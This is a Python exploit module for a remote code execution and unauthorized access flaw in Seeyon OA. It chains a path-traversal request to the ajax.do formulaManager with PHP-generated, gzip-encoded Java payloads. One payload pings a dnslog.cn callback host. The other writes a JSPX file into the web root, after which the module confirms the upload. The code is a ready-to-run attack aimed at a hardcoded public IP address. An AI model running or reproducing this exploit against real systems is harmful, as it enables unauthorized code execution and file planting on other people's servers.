# coding:utf-8
import requests
import os
import subprocess
import re
requests.packages.urllib3.disable_warnings()

class c2Class(object):
	def __init__(self):
		self.vulname = 'Seeyon OA RCE & unauthorized access by ajaxAction(2020-12)'
		self.vulsystem= 'Seeyon OA'
		self.vulsystemintro = '致远OA是一套办公协同软件。'
		self.vulversion = 'V8.0;V7.1、V7.1SP1;V7.0、V7.0SP1、V7.0SP2、V7.0SP3;V6.0、V6.1SP1、V6.1SP2;V5.x'
		self.fofa='seeyon'
		self.findtime='2020-12'
		self.refer= 'https://www.cnblogs.com/potatsoSec/p/14253816.html\nhttps://xz.aliyun.com/t/9010'
		self.testisok=True

		if __file__[-3:]=='pyc':
			self._file=__file__[:-1]
		else:
			self._file=__file__

		self.vulpath='/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip'
		self.dnslog='bcqvv0.dnslog.cn'
		print('Current module use [%s]. You can change dnslog in %s'%(self.dnslog,self._file))
		self.phpdir='E:\\Problem\\phpstudy\\PHPTutorial\\php\\php-7.2.1-nts\\php.exe'
		if 'The PHP Group' not in subprocess.Popen(self.phpdir+' -v',shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read():
			raise Exception('Please set php.exe path in %s'%self._file) 
		self.phpcode_rce_ping_Dir=os.path.join(os.path.dirname(os.path.abspath(self._file)),'ajaxAction_rce_ping.php')
		self.phpcode_rce_ping='''<?php
$aaa=$argv[1];
// echo $aaa;
$arrayNam =array('formulaType' =>1 ,
'formulaName'=>'test',
'formulaExpression'=>'String path = "../webapps/seeyon/";
	ProcessBuilder processBuilder = new ProcessBuilder("ping","xxxxxxxxxxxxxxxxxxxxxxxxxxx");
	Process p = processBuilder.start();
    };test();def static xxx(){',
  );
// print_r($arrayNam);
$arrayNam['formulaExpression']=str_replace("xxxxxxxxxxxxxxxxxxxxxxxxxxx",$aaa,$arrayNam['formulaExpression']);
$a= '';
$b= (Object)array();
$c= 'true';
$e=array($arrayNam,$a,$b,$c);
$json = json_encode($e);
echo urlencode(iconv('latin1', 'utf-8',gzencode($json)));
// 解码代码
// $s='string';//arguments值复制到此
// echo gzdecode(iconv('utf-8', 'latin1', urldecode($s)));
?>'''
		self.phpcode_rce_fu_Dir=os.path.join(os.path.dirname(os.path.abspath(self._file)),'ajaxAction_rce_fu.php')
		self.phpcode_rce_fu='''<?php
$arrayNam =array('formulaType' =>1 ,
'formulaName'=>'test',
'formulaExpression'=>'String path = "../webapps/seeyon/";
java.io.PrintWriter printWriter2 = new java.io.PrintWriter(path+"seeyonUpdateCache.jspx");
	String shell = "PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgIHZlcnNpb249IjEuMiI+IDxqc3A6ZGlyZWN0aXZlLnBhZ2UgY29udGVudFR5cGU9InRleHQvaHRtbCIgcGFnZUVuY29kaW5nPSJVVEYtOCIgLz4gPGpzcDpzY3JpcHRsZXQ+b3V0LnByaW50KCJFUlIwUiBQQUczIDRPNSIpOyA8L2pzcDpzY3JpcHRsZXQ+IDwvanNwOnJvb3Q+";
	sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
	String decodeString = new String(decoder.decodeBuffer(shell),"UTF-8");
	printWriter2.println(decodeString);
	printWriter2.close();
};test();def static xxx(){',
);
// print_r($arrayNam);
$a= '';
$b= (Object)array();
$c= 'true';
$e=array($arrayNam,$a,$b,$c);
$json = json_encode($e);
echo urlencode(iconv('latin1', 'utf-8',gzencode($json)));
// 解码代码
// $s='string';//arguments值复制到此
// echo gzdecode(iconv('utf-8', 'latin1', urldecode($s)));
?>'''
		with open(self.phpcode_rce_ping_Dir,'w+')as f:
			f.writelines(self.phpcode_rce_ping)
		with open(self.phpcode_rce_fu_Dir,'w+')as f:
			f.writelines(self.phpcode_rce_fu)
		self.headers={'User-Agent':'Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)','Upgrade-Insecure-Requests':'1','Content-Type':'application/x-www-form-urlencoded'}
		self.rc_host=re.compile('(?<=://).+?(?=[:/])')
		self.flag=500
		self.flag2=['{"message":null,"code":"','","details":null}']
		self.uploadFile='/seeyon/seeyonUpdateCache.jspx'
		self.flag3=200
		self.flag4='ERR0R PAG3 4O5'


	def payloadGenerate(self,prefix):
		dnslog=prefix+'.'+self.dnslog
		cmd='%s %s %s'%(self.phpdir,self.phpcode_rce_ping_Dir,dnslog)
		# print(cmd)
		payload=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()
		return 'managerMethod=validate&arguments=%s'%payload
	def payloadGenerate2(self):
		cmd='%s %s'%(self.phpdir,self.phpcode_rce_fu_Dir)
		# print(cmd)
		payload=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()
		# print(payload)
		return 'managerMethod=validate&arguments=%s'%payload

	def c2Func(self,target):
		status=0
		returnData=''
		if target.startswith(('http://','https://')):
			if '/seeyon/' in target:
				target=target[:target.index('/seeyon/')]
		else:
			target='http://'+target
		try:
			url=target.strip('/')+self.vulpath
			# print(url)
			prefix=self.rc_host.search(url).group()
			# payload=self.payloadGenerate(prefix)
			payload=self.payloadGenerate2()
			# print(payload)
			resp=requests.post(url=url,headers=self.headers,data=payload,verify=False,timeout=4)
			# print(resp.text)
			if self.flag == resp.status_code and all([f in resp.text for f in self.flag2]):
				check_url=target.strip('/')+self.uploadFile
				check_resp=requests.get(url=check_url,verify=False)
				# print(check_url)
				# print(check_resp.text)
				if self.flag3 == check_resp.status_code and self.flag4 in check_resp.text:
					returnData='%s could be vulnerable.The vuln is %s.'\
					'The payload is [%s], and the upload file is [%s]'%(target.strip('/'),self.vulname,url,check_url)
					status=1
				else:
					returnData='%s could be vulnerable.The vuln is %s.'\
					'The payload is [%s].'%(target.strip('/'),self.vulname,url) #
					status=1
		except Exception as e:
			returnData=str(e)
		return status,returnData

if __name__ == '__main__':
	target='http://113.108.134.18/seeyon/index.jsp'
	pocObj=c2Class()
	print(pocObj.c2Func(target))